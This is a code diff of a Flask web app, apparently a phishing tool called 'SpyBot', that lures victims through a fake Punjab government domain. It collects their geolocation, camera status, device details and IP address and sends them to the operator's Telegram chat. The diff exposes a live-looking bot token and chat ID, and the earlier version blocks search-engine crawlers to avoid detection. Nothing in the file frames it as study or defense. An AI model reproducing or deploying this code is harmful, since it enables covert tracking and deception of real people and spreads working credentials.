@@ -1,63 +1,55 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, render_template, request
 import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
+# Telegram credentials
+OT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
 CHAT_ID = '6908281054'
 
-# === Block User-Agents (Bots etc.) ===
-BAD_AGENTS = ["bot", "crawler", "spider", "Google", "Bing", "Yahoo", "curl", "wget"]
+# Your phishing or tracking page link
+LINK = 'https://govt-of-punjab-pak.onrender.com'
 
-@app.before_request
-def block_bots():
-    ua = request.headers.get('User-Agent', '').lower()
-    for bot in BAD_AGENTS:
-        if bot.lower() in ua:
-            return "Access Denied", 403
-
-# === Front Page Serve (from your HTML) ===
-@app.route("/")
+@app.route('/')
 def index():
-    with open("index.html", "r", encoding="utf-8") as f:
-        return render_template_string(f.read())
+    return render_template('spy.html')
 
-# === Victim Data Collection Endpoint ===
-@app.route("/collect", methods=["POST"])
+@app.route('/collect', methods=['POST'])
 def collect():
-    data = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    location = f"📍 Latitude: {data.get('latitude')}\n📍 Longitude: {data.get('longitude')}" if data.get("latitude") else "❌ Location Not Available"
-    camera_status = data.get("camera", "❓ Unknown")
-    user_agent = data.get("userAgent", "❓ Unknown")
-    device_info = data.get("deviceInfo", "❓")
+    try:
+        data = request.get_json()
+        message = f"""🕵️‍♂️ *SpyBot Alert*
+📍 *Location:* {data.get('latitude', '❌ Unknown')}, {data.get('longitude', '❌')}
+📷 *Camera:* {data.get('camera')}
+🧠 *Device:* {data.get('device')}
+🌐 *UserAgent:* `{data.get('userAgent')}`"""
+        requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
+            'chat_id': CHAT_ID,
+            'text': message,
+            'parse_mode': 'Markdown'
+        })
+    except Exception as e:
+        print(f"[ERROR] {e}")
+    return "✅ Info Received"
 
-    text = f"""👁️ شکار آیا!
-🌐 IP Address: {ip}
-📱 Device: {user_agent}
-📍 Location: {location}
-📷 Camera: {camera_status}
-🧠 Device Info: {device_info}
+# Telegram bot webhook (responds to /start)
+@app.route(f'/bot-{OT_TOKEN.split(":")[0]}', methods=['POST'])
+def webhook():
+    data = request.get_json()
+    if 'message' in data:
+        msg = data['message']
+        if msg.get('text') == '/start':
+            reply = f"""👋 *Welcome to Faizan™ SpyBot*
+📡 System is active. Your tracking link:https://govt-of-punjab-pak.onrender.com
+
+🔗 {LINK}
 """
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-        "chat_id": CHAT_ID,
-        "text": text
-    })
-    return "OK"
-
-# === Telegram Bot /start Handling ===
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def telegram_webhook():
-    update = request.get_json()
-    if "message" in update:
-        chat_id = update["message"]["chat"]["id"]
-        if update["message"].get("text") == "/start":
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
-                "chat_id": chat_id,
-                "text": "👋 خوش آمدید!\n👇 لنک پر کلک کریں:\nhttps://govt-of-punjab-pak.onrender.com"
+            requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
+                'chat_id': msg['chat']['id'],
+                'text': reply,
+                'parse_mode': 'Markdown'
             })
     return "ok"
 
-# === Run App ===
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
